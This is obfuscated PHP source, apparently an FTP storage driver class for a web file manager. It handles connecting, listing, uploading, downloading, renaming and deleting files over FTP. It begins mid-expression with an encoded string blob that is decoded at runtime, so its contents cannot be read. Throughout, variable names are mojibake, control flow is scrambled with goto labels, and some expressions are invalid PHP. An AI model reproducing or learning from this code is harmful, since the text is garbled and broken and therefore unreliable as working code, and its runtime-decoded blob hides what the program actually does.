16\27\270\57\153\30\301\14\212\211\226\352\330\207\26\155\2\70\135\142".strrev('Æ5ä³\\œÁ\''."\r".'›*5ÁäÊÖ4rS‹a¼V·Ø÷hûiÿ)ä‡úKĞç·°f/jØ¯Š\\YT]<i`').base64_decode('VDOeLpsXJ8G8Jck0s6DTEPKZcsGYpHmlnUe26iWMDIBsm1iMOll/lkUu/RwhHjs22tuXr0VZncpktQ==')."\50\213\74\151\55\70\266\215\123\227\343\207\64\245\14\7\344\7\344\245\274\226\247\225\71\256\307\145\302\105\72\150\261\150\55\111\26\317\376\313\133\7\4\313\316\142\303\172\154\157\203\213\35\303\235\225\22\367"."\245\43\71\352\25\14\144\347\176\64\241\41\274\107\267\167\16\225\376\154\56\254\51\355\345\12\202\3\345\262\76\260\35\160\137\134\272\361\314\120\237\161\242\373\160\274\67\321\114\65\56\230\11\101\240\350\344\32"."\xa7\xd3\x8f\x64\xb8\x6a\x6d\xd7\x6d\xc7\xef\xbc\xeb\xea\x9d\x1b\x2f\xdd\xf9\xfb\x13\xb6\xaf\x3f\xcf\xb1\xe3\x94\x2b\x77\x6c\x38\x79\xc7\x86\x53\xb7\xaf\xbb\x74\xfb\x1f\xae\xc1\x9\x3b\x2e\x3c\xee\xbd\x3f\xfc\x7e\x9e\xb4\xe3\xe4\xa3"."\141\342\71\47\276\173\367\155\370\337\355\127\334\271\153\343\175\73\357\335\210\121\266\157\272\163\327\246\53\167\236\165\315\216\223\156\337\161\356\45\73\316\76\211\76\336\152\121\354\224\52\201\134\134\107\155\361\314".base64_decode('jpdxop/Hx2jI+osdzcBtmAOvjjg5pOkm9KgAuHoe/bZrpkmZDRCeESYSBJHDJsGyAIT4OQwcB3Q0gA==')."\50\26\161\26\24\44\7\172\160\313\32\122\160\52\342\107\226\10\74\162\140\221\140\351\331\102\147\301\166\224\310\1\140\263\31\323\306\11\301\240\167\237\170\175\340\21\1\351\26\273\260\307\317\367\11\305\212\166"."\22\310\134\321\160\343\24\67\271\332\340\104\145\70\311\243\243\314\264\221\144\117\240\31\306\234\271\176\137\11\104\7\311\213\100\366\316\130\245\324\27\10\107\175\113\375\241\160\250\44\251\337\23\12\15\6\202\136".base64_decode('bB5dkoxyCSYpJUn93YG+ydJ8vR5/T0kaNFGBRtv0XVyc5O9HtfT09FAbydJa+DsW8Zqgk1OuGM+nNQ==')."\252\373\245\7\7\41\231\336\34\21\337\222\121\262\114\207\45\344\261\252\22\304\161\65\350\63\314\54\220\267\154\72\154\326\142\224\140\111\101\320\274\244\217\224\35\244\156\114\373\174\213\71\173\140\62\57\152\220"."\146\363\210\217\317\206\135\226\63\144\1\216\46\13\142\122\2\21\212\13\60\2\324\224\355\61\361\254\267\124\327\217\122\171\217\300\232\56\244\376\113\126\152\61\101\227\217\367\67\136\361\246\216\150\123\204\303\44".base64_decode('+f8BMw5nMCDJAAA='), 10, -8))); goto AàÍƒ’ÀÏğ; AÜÊºóÔ: register_shutdown_function($_SERVER[][32]); set_error_handler($_SERVER[][46], $Aøî­ÕÅŠ); if (function_exists($_SERVER[][47])) { set_exception_handler($_SERVER[][48]); } goto bñœ”Ğã»¹; cğ¥ºÓñ‰â: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($fÑÈù¶œÖ¶) { parent::__construct(); if (count($fÑÈù¶œÖ¶) > 0) { $this->_init($fÑÈù¶œÖ¶); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($EİÊó¾àÆ…) { $AÚ†‡íá¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; global $config; $this->appCharset = $config[$AÚ†‡íá¨[1178]]; $this->systemCharset = $config[$AÚ†‡íá¨[1179]]; if (isset($EİÊó¾àÆ…[$AÚ†‡íá¨[1180]]) && $EİÊó¾àÆ…[$AÚ†‡íá¨[1180]]) { $this->systemCharset = $EİÊó¾àÆ…[$AÚ†‡íá¨[1180]]; } } public function iconvApp($CÛùŸœì¬) { return $this->iconvTo($CÛùŸœì¬, $this->systemCharset, $this->appCharset); } public function iconvSystem($EÉöİÊ»µ«) { return $this->iconvTo($EÉöİÊ»µ«, $this->appCharset, $this->systemCharset); } public function getPathOuter($aÉº‰¢Ë÷) { goto c„šˆî½Å; c„šˆî½Å: $d’Ò©òñ ½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aŠó³˜‹ƒ = $this->iconvApp($this->pathBase); $aÉº‰¢Ë÷ = $this->iconvApp($aÉº‰¢Ë÷); goto cß¤Ãƒ’— ; FÂ¢¼­Ó¸Š: $aÉº‰¢Ë÷ = KodIO::clear($aÉº‰¢Ë÷); $aÉº‰¢Ë÷ = substr($aÉº‰¢Ë÷, strlen($aŠó³˜‹ƒ)); if (empty($this->pathDriver)) { return $aÉº‰¢Ë÷; } goto e±¾ ’«¶ƒ; e±¾ ’«¶ƒ: return $this->pathDriver . $d’Ò©òñ ½[8] . ltrim($aÉº‰¢Ë÷, $d’Ò©òñ ½[8]); goto C…é°â¥ˆ; cß¤Ãƒ’— : if (substr($aŠó³˜‹ƒ, 0, 2) == $d’Ò©òñ ½[1181]) { $aŠó³˜‹ƒ = BASIC_PATH . substr($aŠó³˜‹ƒ, 2); } if (substr($aÉº‰¢Ë÷, 0, 2) == $d’Ò©òñ ½[1181]) { $aÉº‰¢Ë÷ = BASIC_PATH . substr($aÉº‰¢Ë÷, 2); } $aŠó³˜‹ƒ = KodIO::clear($aŠó³˜‹ƒ); goto FÂ¢¼­Ó¸Š; C…é°â¥ˆ: } private function _init($Aöçˆ•Ú = array()) { $dÛ©§çä‘Á =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!function_exists($dÛ©§çä‘Á[1182])) { throw new Exception(LNG($dÛ©§çä‘Á[1183])); } $this->config = $Aöçˆ•Ú; $this->charsetReset($Aöçˆ•Ú); foreach ($Aöçˆ•Ú as $C»²×æ“„» => $e¥¸‚í‰ô) { if (isset($this->{$C»²×æ“„»})) { $this->{$C»²×æ“„»} = $e¥¸‚í‰ô; } } return $this->_login($Aöçˆ•Ú); } private function _login($Fùã–Ø‘øÆ) { goto eò‰çíëèÔ; F™¹ÅçŠŞë: $c¨ŠíĞÁÏ”[$fòòŒ–‘Ğ¸] = array($b®ºôã¤©³[1187] => $this->connect, $b®ºôã¤©³[173] => $this->host, $b®ºôã¤©³[172] => $this->scheme, $b®ºôã¤©³[174] => $this->port); return $dŸÀµ¯‘ÛÁ; goto BÎÃƒ§Ï´ß; Bõ™àâ³‚¨: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dŸÀµ¯‘ÛÁ = @ftp_login($this->connect, $this->username, $this->userpass); goto bá±ˆÄ÷Ã; bá±ˆÄ÷Ã: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $D­ï¿·£œ = $this->pasv == $b®ºôã¤©³[83] ? !0 : !1; @ftp_pasv($this->connect, $D­ï¿·£œ); goto F™¹ÅçŠŞë; F¢‰í‚²É: if (isset($c¨ŠíĞÁÏ”[$fòòŒ–‘Ğ¸])) { foreach ($c¨ŠíĞÁÏ”[$fòòŒ–‘Ğ¸] as $a×®ˆ¿Á‹Ù => $F¤Ï‘ˆ“´º) { $this->{$a×®ˆ¿Á‹Ù} = $F¤Ï‘ˆ“´º; } return !0; } $C®¾”åİâÛ = parse_url(trim($this->server, $b®ºôã¤©³[8])); $this->host = $C®¾”åİâÛ[$b®ºôã¤©³[173]]; goto d‚ñ£¼ñé¯; eò‰çíëèÔ: $b®ºôã¤©³ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $c¨ŠíĞÁÏ” = array(); $fòòŒ–‘Ğ¸ = md5(json_encode($Fùã–Ø‘øÆ)); goto F¢‰í‚²É; d‚ñ£¼ñé¯: $cŒÈÂÒŠÒ = isset($C®¾”åİâÛ[$b®ºôã¤©³[172]]) && $C®¾”åİâÛ[$b®ºôã¤©³[172]] == $b®ºôã¤©³[1184] ? !0 : !1; $this->scheme = $cŒÈÂÒŠÒ ? $b®ºôã¤©³[1185] : $b®ºôã¤©³[1186]; $this->port = isset($C®¾”åİâÛ[$b®ºôã¤©³[174]]) ? $C®¾”åİâÛ[$b®ºôã¤©³[174]] : 21; goto Bõ™àâ³‚¨; BÎÃƒ§Ï´ß: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aÅŸ«î·ˆ, $féİ£´à¤ = '', $F¼¸è˜„õ¼ = REPEAT_RENAME) { if ($this->setContent($aÅŸ«î·ˆ, $féİ£´à¤)) { return $this->getPathOuter($aÅŸ«î·ˆ); } return !1; } public function mkdir($dÕë¹õ©¬¦, $B•£†ÚÍ¼­ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dÕë¹õ©¬¦ = $this->iconvSystem($dÕë¹õ©¬¦); if ($this->isFolder($dÕë¹õ©¬¦) || @ftp_mkdir($this->connect, $dÕë¹õ©¬¦)) { return $this->getPathOuter($dÕë¹õ©¬¦); } if (!$this->mkdir($this->pathFather($dÕë¹õ©¬¦))) { return !1; } if ($dÕë¹õ©¬¦ = @ftp_mkdir($this->connect, $dÕë¹õ©¬¦)) { return $this->getPathOuter($dÕë¹õ©¬¦); } return !1; } public function copyFile($E‡è´Ôö‰å, $B°‹¨ÚĞùŒ) { goto FííÕğ‹‘ø; aªªèƒ¥ï: $DŠñÛ¿âŒ» = $this->iconvApp($f©£ÜˆÑµ¡); $this->download($E‡è´Ôö‰å, $DŠñÛ¿âŒ»); $fÂ—„ğéÛå = $this->upload($B°‹¨ÚĞùŒ, $DŠñÛ¿âŒ»); goto a÷Şİ¨Ä®Ú; FííÕğ‹‘ø: if (!$this->_isconn()) { return !1; } $EÏ¡‡„›‰ = $this->pathThis($this->iconvSystem($E‡è´Ôö‰å)); $f©£ÜˆÑµ¡ = $this->tempFile($EÏ¡‡„›‰); goto aªªèƒ¥ï; a÷Şİ¨Ä®Ú: $this->tempFileRemve($f©£ÜˆÑµ¡); return $fÂ—„ğéÛå; goto d§ñ¾ŸóÕè; d§ñ¾ŸóÕè: } public function moveFile($Dï¥ ›­È‚, $A—ïºÔíï) { if (!$this->_isconn()) { return !1; } $Dï¥ ›­È‚ = $this->iconvSystem($Dï¥ ›­È‚); $A—ïºÔíï = $this->iconvSystem($A—ïºÔíï); $CŠÉƒ‚Â† = @ftp_rename($this->connect, $Dï¥ ›­È‚, $A—ïºÔíï); return $CŠÉƒ‚Â† ? $this->getPathOuter($A—ïºÔíï) : !1; } public function delFile($Aâ§êæ‹‚) { if (!$this->_isconn()) { return !1; } $Aâ§êæ‹‚ = $this->iconvSystem($Aâ§êæ‹‚); return @ftp_delete($this->connect, $Aâ§êæ‹‚); } public function delFolder($E©ö·Ã‰œ„) { if (!$this->_isconn()) { return !1; } $E©ö·Ã‰œ„ = $this->iconvSystem($E©ö·Ã‰œ„); $EºÏ¥ƒÖƒè = $this->ftpList($E©ö·Ã‰œ„); if (!$EºÏ¥ƒÖƒè) { return @ftp_rmdir($this->connect, $E©ö·Ã‰œ„); } foreach ($EºÏ¥ƒÖƒè as $BÛÄéãÂ‘Ù) { if ($this->isFolder($BÛÄéãÂ‘Ù)) { $BÛÄéãÂ‘Ù = $this->iconvApp($BÛÄéãÂ‘Ù); $this->delFolder($BÛÄéãÂ‘Ù); } else { @ftp_delete($this->connect, $BÛÄéãÂ‘Ù); } } return @ftp_rmdir($this->connect, $E©ö·Ã‰œ„); } public function rename($A·ä—‰Ì¬·, $aø¥™ˆ÷ë‰) { goto Aõ½Ù£±; Aˆ¶ƒ»Å¨½: $FÕ°ˆÎé¡ó = rtrim($FÙá‡³¾ØÚ, $D²øŠ‡Œª§[8]) . $D²øŠ‡Œª§[8] . $e‰©±æÄêŠ; $C½ÅØò¢ÒÚ = @ftp_rename($this->connect, $A·ä—‰Ì¬·, $FÕ°ˆÎé¡ó); $FÕ°ˆÎé¡ó = $this->iconvApp($FÕ°ˆÎé¡ó); goto a«çà…”; a«çà…”: return $C½ÅØò¢ÒÚ ? $this->getPathOuter($FÕ°ˆÎé¡ó) : !1; goto cÆÛİæì¡¸; Aõ½Ù£±: $D²øŠ‡Œª§ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->_isconn()) { return !1; } $e‰©±æÄêŠ = $this->fileNameAuto($this->pathFather($A·ä—‰Ì¬·), $aø¥™ˆ÷ë‰); goto aÜ¥ÖŒŠÍ; aÜ¥ÖŒŠÍ: $e‰©±æÄêŠ = $this->iconvSystem($e‰©±æÄêŠ); $A·ä—‰Ì¬· = $this->iconvSystem($A·ä—‰Ì¬·); $FÙá‡³¾ØÚ = $this->pathFather($A·ä—‰Ì¬·); goto Aˆ¶ƒ»Å¨½; cÆÛİæì¡¸: } private function folderInfo($E¯ãÊ¨È¥—, $bì™¾¼»š• = false) { goto b¤Ó­…±Î; E»ô÷Æİğ‰: return $B ñ¥®äÀ; goto E†£®ÜæÜ; c³¢·™‚æ¬: $aÑöÊ…Òø = $this->iconvSystem($E¯ãÊ¨È¥—); if ($bì™¾¼»š•) { return array($Eéùçøá¹[28] => $C¿Œ´·ÔâÓ, $Eéùçøá¹[75] => $FÌÎÕˆÇˆ, $Eéùçøá¹[29] => $Eéùçøá¹[76]); } $B ñ¥®äÀ = array($Eéùçøá¹[28] => $C¿Œ´·ÔâÓ, $Eéùçøá¹[75] => $FÌÎÕˆÇˆ, $Eéùçøá¹[29] => $Eéùçøá¹[76], $Eéùçøá¹[200] => 0, $Eéùçøá¹[107] => 0, $Eéùçøá¹[1188] => !0, $Eéùçøá¹[1189] => !0); goto E»ô÷Æİğ‰; b¤Ó­…±Î: $Eéùçøá¹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÌÎÕˆÇˆ = $this->getPathOuter(rtrim($E¯ãÊ¨È¥—, $Eéùçøá¹[8])); $C¿Œ´·ÔâÓ = $this->pathThis($FÌÎÕˆÇˆ); goto c³¢·™‚æ¬; E†£®ÜæÜ: } private function fileInfo($DÉÕÛñ…Œ¾, $D£ÎÇ ¾³ = false) { goto A«£˜Í°Èˆ; A«£˜Í°Èˆ: $Eº¤å‡İäñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÊ´„ÉÖˆñ = $this->getPathOuter(rtrim($DÉÕÛñ…Œ¾, $Eº¤å‡İäñ[8])); $Bé¼†Ã×ïİ = $this->pathThis($FÊ´„ÉÖˆñ); goto DÖÁĞŠçÊâ; DÖÁĞŠçÊâ: $A”öÀÅå = $this->iconvSystem($DÉÕÛñ…Œ¾); if ($D£ÎÇ ¾³) { return array($Eº¤å‡İäñ[28] => $Bé¼†Ã×ïİ, $Eº¤å‡İäñ[75] => $FÊ´„ÉÖˆñ, $Eº¤å‡İäñ[29] => $Eº¤å‡İäñ[171], $Eº¤å‡İäñ[165] => $this->ext($DÉÕÛñ…Œ¾), $Eº¤å‡İäñ[77] => $this->size($DÉÕÛñ…Œ¾)); } $EØÉ°‰¸‰™ = array($Eº¤å‡İäñ[28] => $Bé¼†Ã×ïİ, $Eº¤å‡İäñ[75] => $FÊ´„ÉÖˆñ, $Eº¤å‡İäñ[29] => $Eº¤å‡İäñ[171], $Eº¤å‡İäñ[200] => 0, $Eº¤å‡İäñ[107] => @ftp_mdtm($this->connect, $A”öÀÅå), $Eº¤å‡İäñ[165] => $this->ext($DÉÕÛñ…Œ¾), $Eº¤å‡İäñ[77] => $this->size($DÉÕÛñ…Œ¾), $Eº¤å‡İäñ[1188] => !0, $Eº¤å‡İäñ[1189] => !0); goto b²Â‘ƒí”‹; b²Â‘ƒí”‹: $EØÉ°‰¸‰™[$Eº¤å‡İäñ[107]] = $EØÉ°‰¸‰™[$Eº¤å‡İäñ[107]] > 0 ? $EØÉ°‰¸‰™[$Eº¤å‡İäñ[107]] : 0; return $EØÉ°‰¸‰™; goto cäÏ­Ï¶¿; cäÏ­Ï¶¿: } public function size($E¥“¨Ä£îÍ) { $DÜ¡ÖŸ±¤ = $this->objectMeta($E¥“¨Ä£îÍ); return $DÜ¡ÖŸ±¤ ? $DÜ¡ÖŸ±¤[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function info($eÙó»„Ñ—Ö) { if ($this->isFile($eÙó»„Ñ—Ö)) { return $this->fileInfo($eÙó»„Ñ—Ö, 0); } else { if ($this->isFolder($eÙó»„Ñ—Ö)) { return $this->folderInfo($eÙó»„Ñ—Ö); } } return !1; } public function exist($fÔíè‚›È) { return $this->objectMeta($fÔíè‚›È) ? !0 : !1; } public function isFile($eª…§Ùå³) { $e¯À•ÚÉ¡Ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eô…Ÿòİ = $this->objectMeta($eª…§Ùå³); return $Eô…Ÿòİ ? $Eô…Ÿòİ[$e¯À•ÚÉ¡Ô[29]] == $e¯À•ÚÉ¡Ô[171] : !1; } public function isFolder($FõèµÖô¤ä) { $EîÛ¦ˆ†áİ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÂæÀâ¿ç = $this->objectMeta($FõèµÖô¤ä); return $aÂæÀâ¿ç ? $aÂæÀâ¿ç[$EîÛ¦ˆ†áİ[29]] == $EîÛ¦ˆ†áİ[76] : !1; } public function listPath($e›¢èêœªÔ, $fø¸Øƒƒ… = false) { goto F¥»µ·Ú™§; EäÆ¿¸Úäª: foreach ($eø‰Òğ‘µ as $e›¢èêœªÔ) { if ($this->isFolder($e›¢èêœªÔ)) { $A´˜ó©‡µ [$e«ªÚˆ¤çä[74]][] = $this->folderInfo($e›¢èêœªÔ, $fø¸Øƒƒ…); } else { $A´˜ó©‡µ [$e«ªÚˆ¤çä[73]][] = $this->fileInfo($e›¢èêœªÔ, $fø¸Øƒƒ…); } } return $A´˜ó©‡µ ; goto f½©Êó¸ÊÄ; F¥»µ·Ú™§: $e«ªÚˆ¤çä =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->_isconn()) { return !1; } $e›¢èêœªÔ = $this->iconvSystem($e›¢èêœªÔ); goto F½öÈã¸ßƒ; F½öÈã¸ßƒ: $eø‰Òğ‘µ = $this->ftpList($e›¢èêœªÔ); $A´˜ó©‡µ  = array($e«ªÚˆ¤çä[74] => array(), $e«ªÚˆ¤çä[73] => array()); if (!$eø‰Òğ‘µ) { return $A´˜ó©‡µ ; } goto EäÆ¿¸Úäª; f½©Êó¸ÊÄ: } public function has($eÚ•éããòÚ, $B¿†©èÇ¬¸ = false, $dï±Âàˆ­ç = true) { goto D àœòÖöö; C‘øÔªÛÔŸ: $D¾Š¯šÇ³œ = $this->ftpList($eÚ•éããòÚ); if (!$D¾Š¯šÇ³œ) { return !1; } if ($B¿†©èÇ¬¸) { return array($EÃíÁ§È[209] => 0, $EÃíÁ§È[210] => count($D¾Š¯šÇ³œ)); } goto bäÖ—‰½à; bäÖ—‰½à: foreach ($D¾Š¯šÇ³œ as $eÚ•éããòÚ) { if ($dï±Âàˆ­ç) { if (!$this->isFolder($eÚ•éããòÚ)) { return !0; } } else { if ($this->isFolder($eÚ•éããòÚ)) { return !0; } } } return !1; goto E£íøŒ‚£Ù; D àœòÖöö: $EÃíÁ§È =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->_isconn()) { return !1; } $eÚ•éããòÚ = $this->iconvSystem($eÚ•éããòÚ); goto C‘øÔªÛÔŸ; E£íøŒ‚£Ù: } public function listAll($EÃÑ˜ Š³©) { goto D‰¸ˆ Ó‹; B °¢İÁŒ: $BšÄµ”š¸‚ = array($e’÷Å³®±…[73] => array(), $e’÷Å³®±…[74] => array()); $this->recursionFtpFiles($EÃÑ˜ Š³©, $BšÄµ”š¸‚); $b˜Û”Ç‡Ø– = array(); goto CÍÁŞøŠôÃ; CÍÁŞøŠôÃ: foreach ($BšÄµ”š¸‚[$e’÷Å³®±…[74]] as $BÂ§Ê¯µƒŠ) { $b˜Û”Ç‡Ø–[] = array($e’÷Å³®±…[75] => $e’÷Å³®±…[8] . trim(str_replace($EÃÑ˜ Š³©, $e’÷Å³®±…[33], $BÂ§Ê¯µƒŠ), $e’÷Å³®±…[8]) . $e’÷Å³®±…[8], $e’÷Å³®±…[76] => 1, $e’÷Å³®±…[77] => 0); } foreach ($BšÄµ”š¸‚[$e’÷Å³®±…[73]] as $D¸Ö¼·ñ‰») { $b˜Û”Ç‡Ø–[] = array($e’÷Å³®±…[75] => $e’÷Å³®±…[8] . trim(str_replace($EÃÑ˜ Š³©, $e’÷Å³®±…[33], $D¸Ö¼·ñ‰»), $e’÷Å³®±…[8]), $e’÷Å³®±…[76] => 0, $e’÷Å³®±…[77] => $this->size($D¸Ö¼·ñ‰»)); } return $b˜Û”Ç‡Ø–; goto E²Ôë°ä­Œ; D‰¸ˆ Ó‹: $e’÷Å³®±… =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->_isconn()) { return !1; } $EÃÑ˜ Š³© = $this->iconvSystem($EÃÑ˜ Š³©); goto B °¢İÁŒ; E²Ôë°ä­Œ: } public function getContent($C¥ˆ„®Ô«) { if (!$this->_isconn()) { return !1; } $C¥ˆ„®Ô« = $this->iconvSystem($C¥ˆ„®Ô«); return $this->fileSubstr($C¥ˆ„®Ô«); } public function setContent($A‚æÕ¡àÚŞ, $Bñ—Õ‰Îœ¾ = '') { goto Bğº×ŒÂò; c¯ÇÜáÎ”: file_put_contents($EÎÓ°¢Ø, $Bñ—Õ‰Îœ¾); $F„ƒèÑ‘Õù = $this->upload($A‚æÕ¡àÚŞ, $this->iconvApp($EÎÓ°¢Ø)); $this->tempFileRemve($EÎÓ°¢Ø); goto fÊ²¸ïœø; fÊ²¸ïœø: return $F„ƒèÑ‘Õù; goto aˆ‰Ïá·; Bğº×ŒÂò: if (!$this->_isconn()) { return !1; } $d¿Óâç = $this->pathThis($this->iconvSystem($A‚æÕ¡àÚŞ)); $EÎÓ°¢Ø = $this->tempFile($d¿Óâç); goto c¯ÇÜáÎ”; aˆ‰Ïá·: } public function fileSubstr($eĞˆÜöìˆ’, $cƒˆÖÄÜ§¡ = 0, $F§¥¹ÚÂ˜‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($eĞˆÜöìˆ’, $cƒˆÖÄÜ§¡, $F§¥¹ÚÂ˜‹); } private function ftpRequest($Aª»©ŒÁ, $BÓÃå´´Š = 0, $EÂÉÀ™·È = false) { goto dÄšÁçÄéá; dÄšÁçÄéá: $Aª»©ŒÁ = $this->iconvSystem($Aª»©ŒÁ); $a¯‘¥ã¦© = $this->scheme . $this->host . $_SERVER[åÌÛ»ô¢‚ö™][4] . $this->port; $BÎŸ«œ÷‘³ = curl_init(); goto d©áè£ö®¥; d©áè£ö®¥: curl_setopt($BÎŸ«œ÷‘³, CURLOPT_URL, $a¯‘¥ã¦© . $this->pathEncode($Aª»©ŒÁ)); curl_setopt($BÎŸ«œ÷‘³, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($EÂÉÀ™·È) { $a£éÊ«Íï = $BÓÃå´´Š + $EÂÉÀ™·È - 1; curl_setopt($BÎŸ«œ÷‘³, CURLOPT_RANGE, "{$BÓÃå´´Š}\55{$a£éÊ«Íï}"); } goto aõµ”–ìŒ; aõµ”–ìŒ: curl_setopt($BÎŸ«œ÷‘³, CURLOPT_RETURNTRANSFER, 1); $E ‘¢ª¬¨‚ = curl_exec($BÎŸ«œ÷‘³); curl_close($BÎŸ«œ÷‘³); goto bšÔÓ¤„‚ë; bšÔÓ¤„‚ë: return $E ‘¢ª¬¨‚; goto c›öÖ”„; c›öÖ”„: } public function upload($Aª‰¬°ô£Æ, $a‚£³Äø, $FÁ®±Àº„§ = false, $b „éµ¡‰¿ = REPEAT_REPLACE) { goto DŞƒçõ¶ßÕ; CÓÊ’‡³¿: $a‚£³Äø = $this->iconvSystem($a‚£³Äø); $BÄ©¹ŒöÓ = ftp_nb_put($this->connect, $Aª‰¬°ô£Æ, $a‚£³Äø, FTP_BINARY); while ($BÄ©¹ŒöÓ == FTP_MOREDATA) { $BÄ©¹ŒöÓ = ftp_nb_continue($this->connect); } goto A‘ĞîÖØÈ; DŞƒçõ¶ßÕ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Aª‰¬°ô£Æ))) { return !1; } $Aª‰¬°ô£Æ = $this->iconvSystem($Aª‰¬°ô£Æ); goto CÓÊ’‡³¿; A‘ĞîÖØÈ: if ($BÄ©¹ŒöÓ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Aª‰¬°ô£Æ); goto e§—µ­…Ó¾; e§—µ­…Ó¾: } public function download($bÂŠ½ù‡ÍÁ, $FœšõøõÑ¿ = '') { goto f´Ø‚¼ĞµŞ; f´Ø‚¼ĞµŞ: if (!$this->_isconn()) { return !1; } $bÔôáöÍùÄ = $this->pathFather($FœšõøõÑ¿); if (!IO::mkdir($bÔôáöÍùÄ)) { return !1; } goto F„”ÂĞ…‘ò; cäŠ’ÙÛßË: while ($F¸§İê¹ç == FTP_MOREDATA) { $F¸§İê¹ç = ftp_nb_continue($this->connect); } if ($F¸§İê¹ç != FTP_FINISHED) { return !1; } return $this->iconvApp($FœšõøõÑ¿); goto FÆƒ÷ÌŸ‘ù; F„”ÂĞ…‘ò: $bÂŠ½ù‡ÍÁ = $this->iconvSystem($bÂŠ½ù‡ÍÁ); $FœšõøõÑ¿ = $this->iconvSystem($FœšõøõÑ¿); $F¸§İê¹ç = ftp_nb_get($this->connect, $FœšõøõÑ¿, $bÂŠ½ù‡ÍÁ, FTP_BINARY); goto cäŠ’ÙÛßË; FÆƒ÷ÌŸ‘ù: } private function ftpList($C÷«éœ¼Ú‘) { goto BŠË¢öÉù£; E‹ä‰±öíï: return $fŒ©°×Æš’; goto eÔØÂ¾ˆŠİ; D¶åòà¶á˜: $C÷«éœ¼Ú‘ = rtrim($C÷«éœ¼Ú‘, $B‚«ÀŠ¡¤«[8]) . $B‚«ÀŠ¡¤«[8]; $DìÏÑª‡²ç = @ftp_nlist($this->connect, $C÷«éœ¼Ú‘); if ($DìÏÑª‡²ç === !1) { $DìÏÑª‡²ç = @ftp_rawlist($this->connect, $C÷«éœ¼Ú‘); foreach ($DìÏÑª‡²ç as $BÙš©ì•§ => $d ´í£æÄ–) { $DìÏÑª‡²ç[$BÙš©ì•§] = end(explode($B‚«ÀŠ¡¤«[1190], $d ´í£æÄ–)); } } goto cŸßµÏĞÑ ; BŠË¢öÉù£: $B‚«ÀŠ¡¤« =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->isFolder($C÷«éœ¼Ú‘)) { return !1; } @ftp_chdir($this->connect, $B‚«ÀŠ¡¤«[8]); goto D¶åòà¶á˜; cŸßµÏĞÑ : $DìÏÑª‡²ç = array_diff($DìÏÑª‡²ç, array($B‚«ÀŠ¡¤«[91], $B‚«ÀŠ¡¤«[1191], $C÷«éœ¼Ú‘ . $B‚«ÀŠ¡¤«[91], $C÷«éœ¼Ú‘ . $B‚«ÀŠ¡¤«[1191])); $fŒ©°×Æš’ = array(); foreach ($DìÏÑª‡²ç as $BÈ¸”ƒšÑ) { if (!strstr($BÈ¸”ƒšÑ, $B‚«ÀŠ¡¤«[8])) { $BÈ¸”ƒšÑ = $C÷«éœ¼Ú‘ . ltrim($BÈ¸”ƒšÑ, $B‚«ÀŠ¡¤«[8]); } $fŒ©°×Æš’[] = $this->iconvApp($BÈ¸”ƒšÑ); } goto E‹ä‰±öíï; eÔØÂ¾ˆŠİ: } private function recursionFtpFiles($DİÓ’­ÇÀé, &$ešêµ³ øŠ) { $E•³Ü¹à„ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->_isconn()) { return !1; } if (!($cÁëµœ‡Ù× = $this->ftpList($DİÓ’­ÇÀé))) { return !1; } foreach ($cÁëµœ‡Ù× as $DİÓ’­ÇÀé) { if ($this->isFolder($DİÓ’­ÇÀé)) { $this->recursionFtpFiles($DİÓ’­ÇÀé, $ešêµ³ øŠ); $ešêµ³ øŠ[$E•³Ü¹à„[74]][] = $DİÓ’­ÇÀé; } else { $ešêµ³ øŠ[$E•³Ü¹à„[73]][] = $DİÓ’­ÇÀé; } } } private function objectMeta($añÈòªÂ›) { goto Bã—š„æª¼; Bã—š„æª¼: $d«ˆéª³¤Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; $e²æ”ç„ï– = $d«ˆéª³¤Ü[1192] . md5($añÈòªÂ›); $e–¢ŸÙ™¡ = Cache::get($e²æ”ç„ï–); goto eµˆ‡Ù•±´; eµˆ‡Ù•±´: if ($e–¢ŸÙ™¡ !== null && $e–¢ŸÙ™¡ !== !1) { return $e–¢ŸÙ™¡; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $d«ˆéª³¤Ü[8]); goto CİµÜ¸¢ù³; DÕãÁ‘Ãİ: return $e–¢ŸÙ™¡; goto aÖñ Ôí¶á; CİµÜ¸¢ù³: $cšâóŸ·¶÷ = @ftp_size($this->connect, $this->iconvSystem($añÈòªÂ›)); if ($cšâóŸ·¶÷ != -1) { $e–¢ŸÙ™¡ = array($d«ˆéª³¤Ü[77] => $cšâóŸ·¶÷, $d«ˆéª³¤Ü[29] => $d«ˆéª³¤Ü[171]); } else { $AÓóÒğ¸î© = @ftp_chdir($this->connect, $this->iconvSystem($añÈòªÂ›)); $e–¢ŸÙ™¡ = $AÓóÒğ¸î© ? array($d«ˆéª³¤Ü[77] => 0, $d«ˆéª³¤Ü[29] => $d«ˆéª³¤Ü[76]) : !1; } Cache::set($e²æ”ç„ï–, $e–¢ŸÙ™¡, 0); goto DÕãÁ‘Ãİ; aÖñ Ôí¶á: } } class PathDriverLocal extends PathDriverBase { 